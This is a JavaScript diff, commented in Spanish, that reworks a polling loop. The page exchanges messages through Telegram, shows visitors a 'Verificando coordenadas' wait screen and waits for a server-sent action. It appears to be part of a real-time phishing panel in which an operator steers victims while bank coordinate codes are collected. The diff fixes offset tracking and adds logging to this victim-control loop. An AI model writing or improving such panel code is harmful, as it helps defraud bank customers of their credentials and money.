@@ -46,13 +46,17 @@ async function sendTelegram(text, buttons = []) {
 let lastUpdateId = 0;
 
 async function startPolling(handler) {
+  let waitCoords = false;
+
+  // Primero limpiar updates viejos y obtener el ultimo ID
   try {
     const init = await fetch('/api/poll?init=true');
     const initData = await init.json();
-    if (initData.update_id) lastUpdateId = initData.update_id;
+    if (initData.update_id) {
+      lastUpdateId = initData.update_id;
+      console.log('Init OK, lastUpdateId:', lastUpdateId);
+    }
   } catch(e) { console.error('init error:', e); }
-
-  let waitCoords = false;
 
   const iv = setInterval(async () => {
     try {
@@ -60,21 +64,25 @@ async function startPolling(handler) {
       const res = await fetch(`/api/poll?offset=${lastUpdateId}&waitCoords=${waitCoords}`);
       const data = await res.json();
 
-      if (data.update_id) lastUpdateId = data.update_id;
+      console.log('Poll response:', data);
+
+      // Siempre actualizar el offset con lo que devuelve el servidor
+      if (data.update_id !== undefined && data.update_id > lastUpdateId) {
+        lastUpdateId = data.update_id;
+      }
 
       // El servidor nos dice que ahora esperemos las coords
       if (data.waitCoords === true) {
         waitCoords = true;
-        // Actualizar mensaje del wait screen para que el cliente sepa que espere
         const wt = document.querySelector('.wait-title');
         const ws = document.querySelector('.wait-sub');
         if (wt) wt.textContent = 'Verificando coordenadas';
         if (ws) ws.textContent = 'Por favor espera mientras se verifica tu información.';
-        return; // Seguir haciendo polling, NO parar
+        return;
       }
 
       // Sin acción, seguir esperando
-      if (!data.ok || !data.action) return;
+      if (!data.action) return;
 
       // Llegó acción real — parar polling y ejecutar
       clearInterval(iv);
